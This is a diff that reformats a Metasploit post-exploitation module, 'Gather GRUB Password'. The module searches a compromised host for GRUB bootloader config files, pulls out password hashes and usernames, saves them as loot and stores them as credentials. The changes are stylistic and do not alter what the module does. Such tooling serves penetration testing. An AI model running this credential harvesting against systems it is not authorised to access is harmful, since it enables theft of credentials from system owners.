@@ -8,22 +8,24 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Unix
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'         => 'Gather GRUB Password',
-      'Description'  => %q(
-        This module gathers GRUB passwords from GRUB bootloader config files.
-      ),
-      'License'      => MSF_LICENSE,
-      'Author'       =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Gather GRUB Password',
+        'Description' => %q{
+          This module gathers GRUB passwords from GRUB bootloader config files.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Garvit Dewan <d.garvit[at]gmail.com>', # @dgarvit
           'Taeber Rapczak <taeber[at]rapczak.com>',
           'Shelby Pace'
         ],
-      'Platform'     => ['linux', 'osx', 'unix', 'solaris', 'bsd'],
-      'SessionTypes' => ['meterpreter', 'shell'],
-      'References'   => [ ['URL', 'https://help.ubuntu.com/community/Grub2/Passwords#Password_Encryption'] ]
-    ))
+        'Platform' => ['linux', 'osx', 'unix', 'solaris', 'bsd'],
+        'SessionTypes' => ['meterpreter', 'shell'],
+        'References' => [ ['URL', 'https://help.ubuntu.com/community/Grub2/Passwords#Password_Encryption'] ]
+      )
+    )
 
     register_options(
       [
@@ -49,7 +51,7 @@ class MetasploitModule < Msf::Post
       have_pass = true
       pass_line = line.strip.split(' ')
       unless pass_line.length == 3
-        print_status("Unknown Grub password convention. Printing line")
+        print_status('Unknown Grub password convention. Printing line')
         print_status(line)
         next
       end
@@ -66,13 +68,13 @@ class MetasploitModule < Msf::Post
           @creds_hash[pass_line[1]] = pass_line[2]
         end
       else
-        print_status("Unknown Grub password convention. Printing line")
+        print_status('Unknown Grub password convention. Printing line')
         print_status(line)
       end
     end
 
     if have_pass
-      file_loc = store_loot("grub.config", "text/plain", session, contents)
+      file_loc = store_loot('grub.config', 'text/plain', session, contents)
       print_good("#{file} saved to #{file_loc}")
     end
   end
@@ -100,31 +102,31 @@ class MetasploitModule < Msf::Post
       targets << path if file?(path)
     end
 
-    print_status("Searching for GRUB config files..")
+    print_status('Searching for GRUB config files..')
     targets.each do |target|
       parse_passwd_from_file(target)
     end
 
     if @creds_hash.empty? && @pass_hash.empty?
-      print_bad("No passwords found in GRUB config files")
+      print_bad('No passwords found in GRUB config files')
     else
-      print_good("Found credentials")
+      print_good('Found credentials')
 
       cred_table = Rex::Text::Table.new(
-        'Header'  =>  'Grub Credential Table',
-        'Indent'  =>  1,
-        'Columns' =>  [ 'Username', 'Password' ]
+        'Header' => 'Grub Credential Table',
+        'Indent' => 1,
+        'Columns' => [ 'Username', 'Password' ]
       )
 
       @creds_hash.each do |user, pass|
         credential_data = {
-          origin_type:          :session,
-          post_reference_name:  self.refname,
-          private_type:         :nonreplayable_hash,
-          private_data:         pass,
-          session_id:           session_db_id,
-          username:             user,
-          workspace_id:         myworkspace_id
+          origin_type: :session,
+          post_reference_name: refname,
+          private_type: :nonreplayable_hash,
+          private_data: pass,
+          session_id: session_db_id,
+          username: user,
+          workspace_id: myworkspace_id
         }
 
         cred_table << [ user, pass ]
@@ -133,13 +135,13 @@ class MetasploitModule < Msf::Post
 
       @pass_hash.each do |_index, pass|
         credential_data = {
-          origin_type:          :session,
-          post_reference_name:  self.refname,
-          private_type:         :nonreplayable_hash,
-          private_data:         pass,
-          session_id:           session_db_id,
-          username:             '',
-          workspace_id:         myworkspace_id
+          origin_type: :session,
+          post_reference_name: refname,
+          private_type: :nonreplayable_hash,
+          private_data: pass,
+          session_id: session_db_id,
+          username: '',
+          workspace_id: myworkspace_id
         }
 
         cred_table << [ '', pass ]
